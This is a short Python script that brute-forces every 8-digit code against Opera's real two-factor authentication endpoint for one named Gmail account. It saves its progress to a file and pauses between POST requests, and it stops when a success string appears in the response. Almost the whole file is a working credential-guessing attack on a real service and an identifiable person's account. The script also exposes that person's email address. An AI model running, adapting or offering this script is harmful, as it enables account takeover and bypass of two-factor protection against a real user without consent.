import requests
import time
import os

# URL of the login page
url = "https://auth.opera.com/account/authenticate/two-factor"

# Replace with your username or the one you are testing with
username = "bavli898@gmail.com"

# File to save the last attempted password
progress_file = "last_password.txt"

# Function to read the last attempted password from a file
def read_last_password():
    if os.path.exists(progress_file):
        with open(progress_file, "r") as f:
            try:
                return int(f.read().strip())
            except ValueError:
                pass  # In case of an empty file or invalid content
    return 0  # Start from 0 if no file or invalid content

# Function to save the last attempted password to a file
def save_last_password(password):
    with open(progress_file, "w") as f:
        f.write(str(password))

# Function to try each password combination
def brute_force_login():
    start = read_last_password()
    for number in range(start, 100000000):  # Loops through numbers from start to 99,999,999
        password = f"{number:08d}"  # Formats the number as an 8-digit string, e.g., '00000001'
        data = {
            "username": username,
            "password": password
        }
        
        # Send a POST request to the login page
        response = requests.post(url, data=data)
        
        if "Login successful" in response.text:  # Replace with the actual success message
            print(f"Password found: {password}")
            # Clear the progress file as the password has been found
            os.remove(progress_file)
            break
        else:
            print(f"Tried: {password}")
            save_last_password(number)  # Save the current attempt number
            
            time.sleep(0.8)  # Add a delay of 0.8 seconds

# Run the brute-force function
brute_force_login()
